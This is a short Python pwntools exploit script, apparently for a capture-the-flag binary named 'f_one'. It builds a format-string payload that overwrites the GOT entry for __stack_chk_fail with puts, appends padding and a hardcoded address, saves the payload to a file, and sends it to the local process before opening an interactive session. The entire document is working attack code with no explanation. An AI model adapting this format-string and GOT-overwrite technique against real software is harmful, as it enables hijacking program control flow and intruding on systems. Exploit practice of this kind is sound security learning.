from pwn import *

# Load the binary
binary = ELF('./f_one')
context.binary = binary

# Target addresses
first_target_address = binary.got['__stack_chk_fail']
win = binary.symbols['puts']  # Update this with your desired function or ROP gadget
fmt_offset = 6 # Confirmed from earlier tests

# Generate the payload
payload = fmtstr_payload(fmt_offset, {
    first_target_address: win,
})

payload +=  b"a" * 32 + p64(0x000000000004f4e0)

# Write the payload to a file for debugging
with open('payload', 'wb') as f:
    f.write(payload)
# Start the process and send the payload
p = process("./f_one")  # Replace with remote if applicable
p.sendline(payload)

# Interact with the program
p.interactive()
